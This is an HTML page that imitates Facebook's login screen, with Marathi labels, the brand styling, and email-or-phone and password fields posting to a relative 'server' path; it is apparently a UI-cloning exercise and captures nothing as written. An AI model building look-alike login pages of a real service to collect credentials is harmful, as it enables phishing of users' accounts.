<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
        .mainbox{
            width: auto;height: auto;
            position: absolute;
            top: 100px;
            left: 500px;

        }
        .box{
            width: 500px;height: 390px;background-color: #fff;
            border-radius: 13px;
            border:0.6px solid lightgray;
            /* position: fixed; */
            display: block;
            overflow: scroll;
            box-shadow:0px 5px 20px rgb(0,0,0,0.3);
            transition: 0.3s;

        }
    .fb{
        font-family: Klavika, Arial, Helvetica, sans-serif;
        font-weight: 700;
        color: #1877F2;
        font-size: 56px;
        line-height: 100px;
    }
    </style>
</head>
<body bgcolor="whitesmoke">
    <div class="mainbox">
        <center class="fb">facebook</center>
        <center><div class="box">
            <span style="line-height:75px; font-size: 25px; font-weight: 450;">फेसबुकमध्ये प्रवेश करा</span><br>
            <form action="server"><input type="email or number" required placeholder="&nbsp;&nbsp;ईमेल किंवा फोन नंबर" style="width: 90%;height: 55px; font-size: 25px;  border-radius: 7px; border:1.5px solid lightgray;">
            <input type="password" required placeholder="&nbsp;&nbsp;Password" style="width: 90%;height: 55px; font-size: 25px;  border-radius: 7px; border:1.5px solid lightgray;margin-top: 20px;">
            <button type="submit" style="width: 90%;height: 55px; font-size: 25px;  border-radius: 7px; border:none;margin-top: 20px; color: whitesmoke; background-color:#1877F2; font-weight: 600;">लॉग इन करा</button></form>
            <div style="width: 90%;height: 55px; text-align: center; line-height: 4; font-size: 20px; color: #1877F2; font-family: -apple-system, BlinkMacSystemFont, Arial, sans-serif;font-weight: 400;">खाते विसरलात? Facebook साठी साइन अप करा</div>
        </div></center>
    </div>
</body>
</html>
